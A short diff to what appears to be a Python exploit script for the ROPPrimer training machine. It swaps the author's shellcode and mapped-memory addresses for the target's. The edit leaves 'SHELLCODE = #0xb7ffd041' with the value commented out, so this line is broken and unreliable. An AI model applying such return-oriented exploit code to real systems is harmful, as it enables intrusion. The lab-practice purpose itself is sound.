@@ -17,9 +17,13 @@ import struct
 # address of shellcode 0xb7ffa041
 
 # shellcode address in mapped segment
-SHELLCODE = 0xb7ffa041
+# My machine: 0xb7ffa041
+# ROPPrimer machine: 0xb7ffd041
+SHELLCODE = #0xb7ffd041
 # mapped memory segment start
-MAPPED = 0xb7ffa000
+# My machine: 0xb7ffa000
+# ROPPrimer machine: 0xb7ffd000
+MAPPED = 0xb7ffd000
 
 # little endian converter
 def le(x):
